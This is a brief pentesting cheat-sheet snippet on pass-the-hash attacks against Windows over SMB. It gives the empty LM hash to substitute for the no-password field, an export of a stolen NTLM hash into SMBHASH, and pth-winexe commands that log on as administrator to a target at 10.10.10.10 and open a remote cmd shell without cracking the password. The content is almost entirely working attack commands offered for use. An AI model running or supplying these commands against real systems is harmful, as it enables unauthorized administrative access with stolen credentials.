!!! info ""

    ```shell
    #Authenticate by passing the hash as a password instead of cracking it.
    #Replace the NOPASSWORD from the hashes with an empty LM hash: **aad3b435b51404eeaad3b435b51404ee**

    pth-(TAB to see Options)

    # Remove NO PASSWORD on the hashes with an NTLM Hash
    export SMBHASH=...........HASH.................

    # Log on to the target
    pth-winexe -U administrator% //10.10.10.10 cmd

    #OR (just run the following)
    # Log on to the target
    pth-winexe -U administrator%hash //10.10.10.10 cmd

    ```
